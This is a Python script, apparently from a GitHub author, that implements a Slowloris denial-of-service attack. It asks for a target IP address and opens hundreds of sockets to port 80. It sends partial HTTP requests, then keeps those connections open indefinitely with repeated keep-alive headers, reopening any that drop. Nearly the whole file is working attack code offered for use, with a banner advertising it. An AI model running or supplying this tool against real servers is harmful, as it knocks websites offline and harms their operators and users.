import socket
import random
from ipaddress import ip_address
from time import sleep

print(
    """
    ____  _               _            _     
   / ___|| | _____      _| | ___  _ __(_)___ 
   \___ \| |/ _ \ \ /\ / / |/ _ \| '__| / __|   ~>Slowloris Attack<~
    ___) | | (_) \ V  V /| | (_) | |  | \__ |  ~~>Made by tfwcodes(github)<~~
   |____/|_|\___/ \_/\_/ |_|\___/|_|  |_|___/
   
    """
)

def attack(ip, sockets_number):

    headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5",
    "Connection: Keep-Alive"
    ]

    socket_number = int(sockets_number)
    sockets = []

    print("[SOCKETS ARE BEING CREATED]")

    for i in range(socket_number):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, 80))
        sockets.append(s)

    print("[SOCKETS CREATED] - [STARTING ATTACK]")
    sleep(1)

    requests_num = 0
    requests_2_num = 0
    keep_alive_num = 0

    for r in sockets:
        r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        requests_num+=1
        print(f"[INFO] Send get request number {requests_num}")

        for header in headers:
            r.send(bytes("{}\r\n".format(header).encode("utf-8")))
        print("[INFO] Header Sent")

    print("[SENDING KEEP-ALIVE HEADERS]...")
    sleep(1)

    while True:
        for v in sockets:
            try:
                v.send("X-a: {}\r\n".format(0, 5000).encode("utf-8"))
                keep_alive_num +=1
                print(f"[INFO] sent {keep_alive_num} keep-alive headers")
            except socket.error:
                print("[SOCKET ERROR] Attempting again")
                sockets.remove(v)
                try:
                    print("[SOCKETS ARE BEING CREATED]")

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, 80))
                    sockets.append(s)

                    for r in sockets:
                        r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                        requests_2_num += 1
                        print(f"[INFO] Send get request number {requests_2_num}")
                        for header in headers:
                            r.send(bytes("{}\r\n".format(header).encode("utf-8")))
                        print("[INFO] Header Sent")
                except socket.error:
                    continue
def check_ip(ip):
    try:
        ip_address(ip)
        print("[INFO] The ip is valid")
    except:
        print("[INFO] The ip is invalid")
        sleep(1)
        exit()

def check_number_socket(sockets_number):
    if int(sockets_number) <= 200:
        print("[INFO] The socket number must be higher then 200")
        sleep(1)
        input()
        exit()
    else:
        sleep(1)
        attack(ip, socket_number)

ip = input(str("[+] Target ip address: "))
check_ip(ip)
print("[INFO] The port will be automatically 80")
socket_number = input("[+] Enter the number of sockets (<200): ")
check_number_socket(socket_number)
